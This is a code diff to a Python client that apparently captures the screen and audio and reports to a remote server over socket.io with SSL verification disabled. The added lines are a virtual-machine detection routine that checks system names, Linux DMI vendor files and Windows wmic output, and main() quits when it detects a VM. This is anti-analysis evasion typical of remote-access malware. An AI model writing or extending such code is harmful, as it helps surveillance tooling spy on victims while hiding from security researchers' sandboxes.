@@ -1,12 +1,14 @@
 import base64
 import io
 import platform
+import subprocess
 import time
 import wave
-
 import pyaudio
 import pyautogui
 import socketio
+import subprocess
+import re
 from PIL import Image
 
 sio = socketio.Client(reconnection=True, reconnection_attempts=5, reconnection_delay=2, ssl_verify=False)
@@ -16,6 +18,35 @@ system_info = {
     'os_version': platform.version(),
     'hostname': platform.node()
 }
+
+def check_vm():
+    uname = platform.uname()
+    common_vm_signals = ["vm", "virtual", "hyperv", "xen", "kvm", "vbox", "qemu"]
+    if any(signal in uname.system.lower() for signal in common_vm_signals):
+        return True
+
+    if platform.system() == "Linux":
+        dmi_paths = ["/sys/class/dmi/id/product_name", "/sys/class/dmi/id/sys_vendor", "/sys/class/dmi/id/bios_vendor"]
+        for path in dmi_paths:
+            try:
+                with open(path, 'r') as file:
+                    content = file.read().lower()
+                    if any(vm in content for vm in ["vmware", "kvm", "xen", "virtualbox"]):
+                        return True
+            except FileNotFoundError:
+                continue
+
+    if platform.system() == "Windows":
+        wmic_commands = [("bios", "get", "manufacturer"), ("computersystem", "get", "model")]
+        for command in wmic_commands:
+            try:
+                result = subprocess.check_output(["wmic"] + list(command), text=True)
+                if any(vm in result.lower() for vm in ["vmware", "virtualbox", "microsoft corporation"]):
+                    return True
+            except subprocess.CalledProcessError:
+                continue
+
+    return False
 
 
 def log_event(message):
@@ -129,6 +160,12 @@ def attempt_reconnect():
 
 
 def main():
+    if check_vm():
+        print("Running inside a Virtual Machine. Exiting...")
+        return
+    else:
+        print("Running on a physical machine.")
+
     attempt_reconnect()
     try:
         sio.wait()
